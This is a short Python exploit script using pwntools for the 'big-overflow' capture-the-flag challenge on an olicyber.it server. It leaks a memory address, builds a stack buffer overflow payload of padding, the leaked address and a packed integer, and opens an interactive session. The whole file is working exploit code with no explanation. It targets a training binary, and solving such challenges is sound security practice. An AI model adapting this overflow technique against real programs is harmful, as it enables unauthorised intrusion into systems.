from pwn import *
if args.REMOTE:
    p = remote('big-overflow.challs.olicyber.it', 34003)
else:
    p = process('./bigof')
p.recvuntil(b"name?")
p.send(b'a'*32)
p.recvuntil(b'heard ')
address_stream = p.recvuntil(b'but')
print(f'RICEVUTO {address_stream}')
address_stream = address_stream.replace(b'a', b'')
address_stream = address_stream.replace(b'but', b'')

print(f'INVIERO {address_stream}')
p.recvuntil(b'please: ')
num = p32(95099824)
print(num.hex())
address_stream = (int(address_stream.hex(),16)).to_bytes(6)
payload = b'a'*32 + address_stream + b'\x00'*2 +  num
print(payload)
p.send(payload)
p.interactive()